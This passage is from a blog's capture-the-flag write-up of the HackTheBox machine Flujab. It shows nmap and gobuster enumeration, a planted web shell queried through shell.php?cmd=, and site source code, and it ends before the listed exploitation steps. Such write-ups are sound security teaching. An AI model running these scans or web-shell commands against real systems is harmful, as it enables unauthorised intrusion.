<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    
    
    <meta property="article:tag" content="hackthebox" />
    
    <meta property="article:tag" content="htb" />
    
    <meta property="article:tag" content="boot2root" />
    
    <meta property="article:tag" content="flujab" />
    
    <meta property="article:tag" content="writeup" />
    
    <meta property="article:tag" content="write-up" />
    
    <meta property="article:tag" content="linux" />
    
    <meta property="article:tag" content="smtp" />
    
    <meta property="article:tag" content="sql-injection" />
    
    <meta property="article:tag" content="caching" />
    
    <meta property="article:tag" content="ajenti" />
    
    <meta property="article:tag" content="ajenti-filesystem" />
    
    <meta property="article:tag" content="ssh-keys" />
    
    <meta property="article:tag" content="gnu-screen" />
        

    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:title" content="HTB Flujab">
    <meta name="twitter:description" content="10.10.10.124 | 40 pts">
    <meta name="twitter:site" content="@jebidiah-anthony" />
    <meta name="twitter:creator" content="@feeeellliix">

    
    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/24_flujab/flujab.jpg" />
    

    
    <meta property="og:title" content="HTB Flujab" />
    

    <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>HTB Flujab | jebidiah-anthony</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="HTB Flujab" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="10.10.10.124 40 pts" />
<meta property="og:description" content="10.10.10.124 40 pts" />
<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/24_Flujab.html" />
<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/24_Flujab.html" />
<meta property="og:site_name" content="jebidiah-anthony" />
<script type="application/ld+json">
{"description":"10.10.10.124 40 pts","@type":"WebPage","headline":"HTB Flujab","url":"https://jebidiah-anthony.github.io/boxes/24_Flujab.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    <style>
      .user_host { color: green; }
      .sys_dir { color: #779ECB; }
      p { color:#aaa; }
      header { margin-bottom: 0px; }
      .header .navbtn {
	position: fixed;
	width: 0px;
	visibility: hidden;
      }
      .header .title { 
	padding-left: 69px;
	vertical-align: middle;
      }
      .header .title h2 { margin: 0; } 

      .container {
	max-width: 1200px;
      }
      .sidebar {
        border-right: 1px dashed #b5e853;
	bottom: 0;
        height: 100%;
	overflow: auto;
	padding: 10px 10px 10px 10px;
        position: fixed;
	top: 0;
        width: 230px;
      }
      .openbtn { 
	color:#b5e853;
	font-size:30px;
	cursor:pointer
      }
      .closebtn {
	color:#b5e853;
	font-size:69px;
	cursor:pointer;
	position:absolute;
	top:0;
	right:25px;
	font-size:36px;
	margin-left:50px;
	visibility:hidden;
      }
      
      .ctf_content {
        margin-left: 250px;
	padding-bottom: 5px;
      }
      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
      .ctf_content h3 { margin: 20px 0px 0px 10px; }
      .ctf_content img {
 	display: block;
	margin-left: auto;
	margin-right: auto;
	max-width: 100%;
	padding: 0 10px 0 0;
      }
      .ctf_content table { padding: 0 15px; }

      #main_content h1 { padding: 20px 0px 0px 8px; }
      #main_content h2, p, pre { 
	padding-right:10px;
	padding-left:15px; 
      }
      #main_content h4 { 
        margin: 20px 0px 10px 0px; 
        padding-left: 25px; 
      }
      #main_content ol, ul { margin: 0 0 0 10px; }

      .highlighter-rouge { padding: 0 10px 0 10px; }

      .section-divider{
        border-bottom: 1.5px solid #b5e853;
        padding-top:28px;
        width:55%;
      }
      
      @media screen and (min-width: 801px) {
	.ctf_content {
          margin-left: 250px;
	  padding-bottom: 5px;
        }
      }
      @media screen and (max-width: 800px) {
        header {
	  background-color: #202020;
	  height: 80px;
	  padding: 0px 0 0 0;
	  position: fixed;
	  top: 0;
	}
        .header .navbtn {
          height: 80px;
	  padding: 18px 0 0 20px;
          visibility: visible;
	  width: 100px;
        }
	.header .title { padding-left: 100px; }
	.header .title h1 { padding-top: 5px; }
        .header .title h2 { margin: 0; }

	.container {
	  width:100%;
	}
	.sidebar {
          width: 0;
          z-index: 1;
          overflow-x: hidden;
	  padding: 0;
          transition: 0.5s;
	}
	.sidebar h2 { 
	  font-size: 18px; 
	  padding: 10px 10px 5px 10px;
	}
	.sidebar div { 
	  font-size: 15px; 
	  padding: 5px 10px 5px 10px;
	}
	.closebtn { visibility:visible; }

	.highlighter-rouge { padding: 0 0 0 0; }

	.ctf_content {
	  margin: 0;
	}
	.ctf_content h2 { padding: 15px 0px 0px 5px; }
        .ctf_content h3 { margin: 15px 10px 0px 15px; }
        .ctf_content img {
	  max-width: 100%;
	  padding: 0 10px 0 0;
        }
	.ctf_content table { 
	  margin: 0 10px 0px -8px;
	  min-width: 800px;
	}

        #main_content { margin-top:80px; }
	#main_content code { font-size: 15px; }
	#main_content h1 { font-size: 25px; }
	#main_content h2 { font-size: 22px; }
	#main_content h3 { font-size: 18px; }
	#main_content h4 { padding-left: 20px; }
	#main_content ol, ul {
	  font-size: 14px;
	  margin: 0 0 0 12px;
	  padding: 0 0 0 25px;
	}
	#main_content table { font-size: 14px; }
      }

      @media screen and (max-width: 480px) {
        header {
	  background-color: #202020;
	  height: 70px;
	  padding: 0px 0 0 0;
	  position: fixed;
	  top: 0;
	}
        .header .navbtn {
          height: 70px;
	  padding: 14px 0 0 18px;
        }
	.header .title { padding-left: 100px; }
	.header .title h1 { font-size:22px; }
        .header .title h2 { font-size:16px; }

	#main_content code { font-size: 13px; }
        #main_content ol, ul {
	  font-size: 13px;
	  margin: 0 0 0 12px;
	  padding: 0 0 0 25px;
	}
	#main_content table { font-size: 13px; }
      }
    </style>

  </head>

  <body>
    <div class="container">
       <div id="sidebar" class="sidebar">
         <span class="closebtn" onclick="closeNav()">&times;</span>      
	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>

<div style="padding-top:10px">
  
  > <a href="/">whoami</a>
  
</div>
<div style="padding-top:10px">  
  >  <a href="/htb.html">
    
    <strong style="color:orange">htb writeups</strong>
    
  </a>
</div>
<div style="padding-top:10px">
  > <a href="/ctf.html">
    
    ctf writeups
    
  </a>
</div>
<div style="padding-top:10px">
  > <a href="/projects.html">
    
    projects
    
  </a>
</div>
</div>
	 <div style="padding-bottom:20px">
           
             <h2 style="margin-bottom:0; padding-top: 20px">[HTB BOXES]</h2>


<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/62_Travel.html">Travel</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/61_Quick.html">Quick</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html">Unbalanced</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/38_Bitlab.html">Bitlab</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/33_Safe.html">Safe</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/32_Ellingson.html">Ellingson</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html">WriteUp</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/30_swagshop.html">swagshop</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/29_kryptos.html">kryptos</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/28_Luke.html">Luke</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/26_CTF.html">CTF</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/25_Friendzone.html">Friendzone</a>
  
</div>

<div style="padding-top:10px">
  
  > <strong style="color:orange">Flujab</strong>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/23_Help.html">Help</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/22_Chaos.html">Chaos</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/21_Lightweight.html">Lightweight</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/20_Irked.html">Irked</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/19_Teacher.html">Teacher</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/15_Mischief.html">Mischief</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/14_Waldo.html">Waldo</a>
  
</div>



	   
	 </div>
       </div>
       <div id="content" class="ctf_content">
	 <header>
           <div class="header">
             <div class="navbtn">
               <span class="openbtn" onclick="openNav()">&#9776;</span>
	     </div>
	     <div class="title">
               <h1>jebidiah-anthony</h1>
               <h2 style="padding:0 0 0 0">write-ups and what not</h2>
	     </div>
           </div>
         </header>
         <section id="main_content"><h1 id="htb-flujab-101010124-machine-write-up"><span style="color:red">HTB Flujab (10.10.10.124) MACHINE WRITE-UP</span></h1>

<hr />

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<ul>
  <li><a href="#part-1--initial-recon">PART 1 : INITIAL RECON</a></li>
  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
    <ul>
      <li><a href="#tcp-port-443-httpscustoomercaremegabankhtb"><strong>TCP PORT 443</strong> (<strong>https://custoomercare.megabank.htb</strong>)</a></li>
      <li><a href="#tcp-port-443-httpssmtpflujabhtb"><strong>TCP PORT 443</strong> (<strong>https://smtp.flujab.htb/</strong>)</a></li>
      <li><a href="#tcp-port-443-httpsfreeflujabhtb"><strong>TCP PORT 443</strong> (<strong>https://freeflujab.htb/</strong>)</a></li>
    </ul>
  </li>
  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
  <li><a href="#part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</a></li>
  <li><a href="#part-5--privilege-escalation-sysadm---root">PART 5 : PRIVILEGE ESCALATION (sysadm -&gt; root)</a></li>
</ul>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.124
<span class="go">
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  443/tcp  open  https
  8080/tcp open  http-proxy

</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-oN</span> flujab.nmap <span class="nt">-p22</span>,80,443,8080 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.124
<span class="go">
  PORT     STATE SERVICE  VERSION
  22/tcp   open  ssh?
  80/tcp   open  http     nginx
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: ClownWare Proxy
  |_http-title: Did not follow redirect to https://10.10.10.124/
  443/tcp  open  ssl/http nginx
  | http-methods: 
  |_  Supported Methods: GET HEAD POST
  |_http-server-header: ClownWare Proxy
  |_http-title: Direct IP access not allowed | ClownWare
  | ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
  | Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
  | Issuer: commonName=ClownWare Certificate Authority/organizationName=ClownWare Ltd./stateOrProvinceName=LON/countryName=UK
  | Public Key type: rsa
  | Public Key bits: 4096
  | Signature Algorithm: sha256WithRSAEncryption
  | Not valid before: 2018-11-28T14:57:03
  | Not valid after:  2023-11-27T14:57:03
  | MD5:   1f22 1ef7 c8bf d110 dfe6 2b6f 0765 2245
  |_SHA-1: 7013 803a 92b3 f1f0 735d 404b 733c 712b bea6 ffcc
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn: 
  |_  http/1.1
  | tls-nextprotoneg: 
  |_  http/1.1
  8080/tcp open  ssl/http nginx
  | http-methods: 
  |_  Supported Methods: GET HEAD POST
  |_http-server-header: ClownWare Proxy
  |_http-title: Direct IP access not allowed | ClownWare
  | ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
  | Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
  | Issuer: commonName=ClownWare Certificate Authority/organizationName=ClownWare Ltd./stateOrProvinceName=LON/countryName=UK
  | Public Key type: rsa
  | Public Key bits: 4096
  | Signature Algorithm: sha256WithRSAEncryption
  | Not valid before: 2018-11-28T14:57:03
  | Not valid after:  2023-11-27T14:57:03
  | MD5:   1f22 1ef7 c8bf d110 dfe6 2b6f 0765 2245
  |_SHA-1: 7013 803a 92b3 f1f0 735d 404b 733c 712b bea6 ffcc
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn: 
  |_  http/1.1
  | tls-nextprotoneg: 
  |_  http/1.1

</span></code></pre></div></div>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<p>Various domains and subdomains were captured during the <strong><code class="highlighter-rouge">nmap</code></strong> scan and I added them to the <strong><code class="highlighter-rouge">/etc/hosts</code></strong> file:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
127.0.1.1       kali f
10.10.10.124    clownware.htb              ///DEAD END
10.10.10.124    sni147831.clownware.htb    ///DEAD END
10.10.10.124    *.clownware.htb            ///DEAD END
10.10.10.124    proxy.clownware.htb        ///DEAD END
10.10.10.124    console.flujab.htb         ///DEAD END
10.10.10.124    sys.flujab.htb             ///DEAD END
10.10.10.124    smtp.flujab.htb
10.10.10.124    vaccine4flu.htb            ///DEAD END
10.10.10.124    bestmedsupply.htb          ///DEAD END 
10.10.10.124    custoomercare.megabank.htb 
10.10.10.124    flowerzrus.htb             ///DEAD END
10.10.10.124    chocolateriver.htb         ///DEAD END
10.10.10.124    meetspinz.htb              ///DEAD END
10.10.10.124    rubberlove.htb             ///DEAD END 
10.10.10.124    freeflujab.htb
10.10.10.124    flujab.htb                 ///DEAD END

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div></div>

<p>From initial observations, most of the domains contain either an embedded image or video and <strong>bestmedsupply.htb</strong> and <strong>flowerzrus.htb</strong> only contains static <strong><em>.html</em></strong> pages. Three domains, however, seem worth exploring – <strong><code class="highlighter-rouge">https://custoomercare.megabank.htb</code></strong>, <strong><code class="highlighter-rouge">smtp.flujab.htb</code></strong>, and <strong><code class="highlighter-rouge">freeflujab.htb</code></strong></p>

<h3 id="tcp-port-443-httpscustoomercaremegabankhtb"><strong>TCP PORT 443</strong> (<strong><code class="highlighter-rouge">https://custoomercare.megabank.htb</code></strong>)</h3>

<p>Opening <strong><code class="highlighter-rouge">https://custoomercare.megabank.htb</code></strong> on your browser loads the following and it explicitly says: “<code class="highlighter-rouge">The site ahead may contain harmful programs</code>”</p>

<p><img src="./screenshots/24_flujab/443_custoomercare_megabank.png" alt="custoomercare.megabank.htb" /></p>

<p>Running <code class="highlighter-rouge">gobuster</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nt">-k</span> <span class="nt">-u</span> https://custoomercare.megabank.htb <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php
<span class="go">  
</span><span class="gp">  [-] Wildcard response found: https://custoomercare.megabank.htb/48a44669-2c2f-4568-ac60-9d92eb6396db =&gt;</span><span class="w"> </span>301
<span class="go">
</span></code></pre></div></div>

<p>All <code class="highlighter-rouge">404</code> requests are redirected (<code class="highlighter-rouge">301</code>) to https://clownware.htb/cwerror_pages.php which contains the following error page:</p>

<p><img src="./screenshots/24_flujab/443_cwerror.gif" alt="cwerror" /></p>

<p>Now, running <code class="highlighter-rouge">gobuster</code> but limiting response codes to only <code class="highlighter-rouge">200</code> :</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nt">-k</span> <span class="nt">-s</span> 200 <span class="nt">-u</span> https://custoomercare.megabank.htb <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php
<span class="go">      
  /index.php (Status: 200)
  /shell.php (Status: 200)
  
</span></code></pre></div></div>

<p>And hidden in <strong><code class="highlighter-rouge">https://custoomercare.megabank.htb/shell.php</code></strong>’s page source:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
53cret 5shell
shell.php?cmd=[commands]
--&gt;</span>
</code></pre></div></div>

<p>The webpage seems to accept shell commands – <code class="highlighter-rouge">?cmd=id</code> returns <code class="highlighter-rouge">uid=0(root) gid=0(root) groups=0(root)</code> and <code class="highlighter-rouge">?cmd=ls</code> returns <code class="highlighter-rouge">root.txt</code> but <code class="highlighter-rouge">?cmd=cat root.txt</code> returns:</p>

<p><img src="./screenshots/24_flujab/443_megabank_shell.png" alt="Megabank Shell" /></p>

<p>The webpage is just a troll.</p>

<h3 id="tcp-port-443-httpssmtpflujabhtb"><strong>TCP PORT 443</strong> (<strong><code class="highlighter-rouge">https://smtp.flujab.htb/</code></strong>)</h3>

<p>Now moving on to <strong><code class="highlighter-rouge">https://smtp.flujab.htb/</code></strong> brings you to:</p>

<p><img src="./screenshots/24_flujab/443_smtp_flujab.png" alt="smtp.flujab.htb" /></p>

<p>With the following page source:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...

        <span class="c">&lt;!-- Header --&gt;</span>
        <span class="nt">&lt;section</span> <span class="na">id=</span><span class="s">"header"</span> <span class="na">class=</span><span class="s">"wrapper style3"</span><span class="nt">&gt;</span>
   
            <span class="c">&lt;!-- Logo --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"logo"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/?login"</span><span class="nt">&gt;</span>SMTP Mail Configuration<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;/br&gt;</span>
                <span class="c">&lt;!-- NOW DEPRICATED! This function has been integrated into the new free service application!--&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/section&gt;</span>
  
...omitted...

    <span class="nt">&lt;h2&gt;</span>Log in here for your Mail-in-a-Box control panel.<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"form-horizontal"</span> <span class="na">role=</span><span class="s">"form"</span> <span class="na">onsubmit=</span><span class="s">"do_login(); return false;"</span><span class="nt">&gt;</span>

...omitted...
</code></pre></div></div>

<p>The “free service application” being referred to must be <strong><code class="highlighter-rouge">https://freeflujab.htb</code></strong> which we’ll get to in a bit.</p>

<p>Examining the <strong><code class="highlighter-rouge">do_login()</code></strong> function referenced as a form action:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">do_login</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginEmail</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">show_modal_error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Login Failed</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Enter your email address.</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
   	  <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginEmail</span><span class="dl">'</span><span class="p">).</span><span class="nx">focus</span><span class="p">();</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginPassword</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">show_modal_error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Login Failed</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Enter your email password.</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginPassword</span><span class="dl">'</span><span class="p">).</span><span class="nx">focus</span><span class="p">();</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">// Exchange the email address &amp; password for an API key.</span>
  <span class="nx">api_credentials</span> <span class="o">=</span> <span class="p">[</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginEmail</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginPassword</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()]</span>
  <span class="nx">api</span><span class="p">(</span>
    <span class="dl">"</span><span class="s2">/me</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span>
    <span class="p">{</span> <span class="p">},</span>
    <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">){</span> 
      <span class="c1">// This API call always succeeds. It returns a JSON object indicating</span>
      <span class="c1">// whether the request was authenticated or not.</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span> <span class="o">!=</span> <span class="dl">"</span><span class="s2">ok</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Show why the login failed.</span>
        <span class="nx">show_modal_error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Login Failed</span><span class="dl">"</span><span class="p">,</span> <span class="nx">response</span><span class="p">.</span><span class="nx">reason</span><span class="p">)</span>
        <span class="c1">// Reset any saved credentials.</span>
        <span class="nx">do_logout</span><span class="p">();</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="dl">"</span><span class="s2">api_key</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">response</span><span class="p">))</span> <span class="p">{</span>
        <span class="c1">// Login succeeded but user might not be authorized!</span>
        <span class="nx">show_modal_error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Login Failed</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You are not an administrator on this system.</span><span class="dl">"</span><span class="p">)</span>
        <span class="c1">// Reset any saved credentials.</span>
        <span class="nx">do_logout</span><span class="p">();</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// Login succeeded.</span>
        <span class="c1">// Save the new credentials.</span>
        <span class="nx">api_credentials</span> <span class="o">=</span> <span class="p">[</span><span class="nx">response</span><span class="p">.</span><span class="nx">email</span><span class="p">,</span> <span class="nx">response</span><span class="p">.</span><span class="nx">api_key</span><span class="p">];</span>
        <span class="c1">// Try to wipe the username/password information.</span>
        <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginEmail</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
        <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginPassword</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
        <span class="c1">// Remember the credentials.</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">localStorage</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">sessionStorage</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginRemember</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">())</span> <span class="p">{</span>
            <span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">miab-cp-credentials</span><span class="dl">"</span><span class="p">,</span> <span class="nx">api_credentials</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">));</span>
            <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">miab-cp-credentials</span><span class="dl">"</span><span class="p">);</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">localStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">miab-cp-credentials</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">miab-cp-credentials</span><span class="dl">"</span><span class="p">,</span> <span class="nx">api_credentials</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">));</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="c1">// Open the next panel the user wants to go to. Do this after the XHR response</span>
        <span class="c1">// is over so that we don't start a new XHR request while this one is finishing,</span>
        <span class="c1">// which confuses the loading indicator.</span>
        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">show_panel</span><span class="p">(</span><span class="o">!</span><span class="nx">switch_back_to_panel</span> <span class="o">||</span> <span class="nx">switch_back_to_panel</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">login</span><span class="dl">"</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">system_status</span><span class="dl">'</span> <span class="p">:</span> <span class="nx">switch_back_to_panel</span><span class="p">)</span> <span class="p">},</span> <span class="mi">300</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<p><strong><code class="highlighter-rouge">api()</code></strong> is referenced by the included js file but is not defined anywhere so t  he login functionality might be a <strong>RABBIT HOLE</strong></p>

<h3 id="tcp-port-443-httpsfreeflujabhtb"><strong>TCP PORT 443</strong> (<strong><code class="highlighter-rouge">https://freeflujab.htb/</code></strong>)</h3>

<p>Lastly, we visit the referenced <strong><em>free service</em></strong> from earlier. Opening <strong><code class="highlighter-rouge">https://freeflujab.htb/</code></strong> on your browser leads you to:</p>

<p><img src="./screenshots/24_flujab/443_freeflujab.png" alt="freeflujab.htb" /></p>

<p>One thing you’ll notice is that the <strong><code class="highlighter-rouge">favicon.ico</code></strong> image doesn’t load and viewing its contents reveal:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="nb">define</span><span class="p">(</span><span class="s1">'SafeIncludes'</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'includes/get_host.php'</span><span class="p">);</span>
<span class="c1">//                                                                                              /$$              </span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/tokens.php'</span><span class="p">);</span><span class="c1">//                                                               | $$              </span>
<span class="c1">//   /$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$$  /$$$$$$         /$$$$$$$  /$$$$$$   /$$$$$$$  /$$$$$$     </span>
<span class="c1">//  /$$_____/ /$$__  $$| $$  | $$ /$$__  $$ /$$_____/ /$$__  $$       /$$_____/ /$$__  $$ /$$__  $$ /$$__  $$    </span>
<span class="c1">// |  $$$$$$ | $$  \ $$| $$  | $$| $$  \__/| $$      | $$$$$$$$      | $$      | $$  \ $$| $$  | $$| $$$$$$$$    </span>
